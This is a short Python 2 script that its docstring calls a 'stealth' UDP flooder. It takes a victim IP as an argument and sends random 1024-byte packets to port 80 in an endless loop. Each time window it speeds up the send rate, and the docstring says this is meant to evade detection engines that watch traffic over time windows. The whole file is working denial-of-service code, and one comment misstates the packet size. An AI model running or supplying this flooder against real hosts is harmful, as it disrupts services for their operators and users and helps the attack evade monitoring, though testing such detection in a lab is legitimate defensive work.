"""
UDP flooder to simulate stealth DOS attack
It will start slowly and increase its rate in order to avoid engines which work with time window

Gets the victim IP as an argument
"""
import os
import time
import socket
import random

import sys

# GLOBALS
victim = sys.argv[1]

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)  # 1024 represents one byte to the server

vport = 80
sent = 0

# window_length = 6 * 60
window_length = 20


def stealth_dos():
    global sent
    # send_interval = 10
    send_interval = 5.0
    duration = 0

    while True:
        # send packet
        client.sendto(bytes, (victim, vport))

        # increment counter
        sent += 1

        # print log
        print "%s packets were sent to %s:%s. interval time: %s, send interval: %s" % (sent, victim, vport, duration, send_interval)

        # sleep for send_interval secs
        time.sleep(send_interval)

        # increment duration
        duration += send_interval

        # if window len wasn't over continue
        if duration < window_length:
            continue

        # start new window and initial duration and send interval
        duration = 0
        send_interval *= 0.666


# Main
if __name__ == '__main__':
    stealth_dos()